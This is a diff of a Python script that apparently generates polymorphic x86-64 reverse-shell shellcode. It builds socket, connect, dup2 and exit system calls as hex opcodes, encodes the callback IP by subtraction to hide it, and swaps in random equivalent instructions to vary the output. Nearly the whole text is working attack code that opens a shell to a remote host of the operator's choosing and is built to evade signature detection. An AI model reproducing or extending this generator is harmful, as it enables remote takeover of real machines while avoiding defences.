@@ -118,46 +118,44 @@ def create_socket():
         PAYLOAD += "48ffc6"
     PAYLOAD += call()
 
-def ip_to_opcode(ip, port):
-    ip_array_greater = []
-    ip_array_little = [0]*4
-    port_array_greater = []
-    port_array_little = []
-    i = 0
-    for ip in ip.split('.'):
-        print(len(ip_array_little))
-        ip_array_greater.append(r(int(ip)+1, 255))
-        ip_array_little[i] = ip_array_greater[i] - int(ip) 
-        i+=1
-    #print(ip_array_little)
-    #print(ip_array_greater)
-    hexip_great = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip_array_greater))
-    port_length = len(port)
-    ropt = hex(socket.htons(int(port)))
-    print(hexip_great.lower())
-    print(ropt.lower())
-    socket_connect(hexip_great.lower(), ropt.lower())
-
 
 def socket_connect(ip, port):
-    global PAYLOAD
-    l = ["4889c74989fa", "4889c74989c2", "50415a4C89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
-    PAYLOAD += l[r(0,len(l)-1)]   
-    clean("rax")
-    PAYLOAD += "B02a" if r(0,1) else "042a"
-    clean("rbx")
-    PAYLOAD += "53" # push rbx
+   global PAYLOAD
+   l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
+   PAYLOAD += l[r(0,len(l)-1)]   
+   clean("rax")
+   PAYLOAD += "B02A" if r(0,1) else "042A"
+   clean("rbx")
+   PAYLOAD += "53" # push rbx
+   ip_greater = []
+   ip_to_substract = []
+   cmp = 0
+   for ip in ip.split("."):
+    ip_to_substract.append(r(int(ip)+1, 255))
+    ip_greater.append(ip_to_substract[cmp] - int(ip))
+    cmp += 1
+    
+    
+    PAYLOAD += "BE" # mov esi
+    for i in range(0, len(ip_to_substract)):
+        if ip_to_substract[i] < 17: PAYLOAD += "0"
+        PAYLOAD += hex(ip_to_substract[i])[2:]
 
-    PAYLOAD += 'be'
-    PAYLOAD += str(ip)
+    PAYLOAD += "81EE" # sub esi
+    for i in range(0,len(ip_greater)):
+        if ip_greater[i] < 17: PAYLOAD += "0"
+        PAYLOAD += hex(ip_greater[i])[2:]
+
+    
+    port = hex(socket.htons(int(port)))[2:]
+
     PAYLOAD += "566668" # push
     PAYLOAD += port[2:] + port[:2] # Le port en little endian    
-    PAYLOAD += "666a02" #AF_INET
-    PAYLOAD += "4889e6" if r(0,1) else "4831f64801e6" # soit on fait "mov rsi, rsp" soit on fait "xor rsi, rsi ; add rsi, rsp"
-    PAYLOAD += "b218" # mov dl,24
+    PAYLOAD += "666A02" #AF_INET
+    PAYLOAD += "4889E6" if r(0,1) else "4831F64801E6" # soit on fait "mov rsi, rsp" soit on fait "xor rsi, rsi ; add rsi, rsp"
+    PAYLOAD += "B218" # mov dl,24
     PAYLOAD += call()
     return PAYLOAD
-
 
 
 def dup2x3():
@@ -166,8 +164,11 @@ def dup2x3():
     for i in range(0,3):
         PAYLOAD += "b03f"
         PAYLOAD += "4c89d7"
+        if not(i):
+            PAYLOAD += clean('rsi')
+        else:
+            PAYLOAD += '48ffc6' # inc rsi
         PAYLOAD += call()
-        PAYLOAD += clean('rsi')
 
 
 
@@ -208,10 +209,9 @@ PAYLOAD += clean("rsi")
 PAYLOAD += clean("rbx")
 PAYLOAD += clean("rsi")
 create_socket()
-ip_to_opcode(argv[1], argv[2])
+socket_connect(argv[1], argv[2])
 dup2x3()
-
-factorOffus("0x68732f0069622f2f")
+#factorOffus("0x68732f0069622f2f")
 #print(PAYLOAD)
 _exit()
 
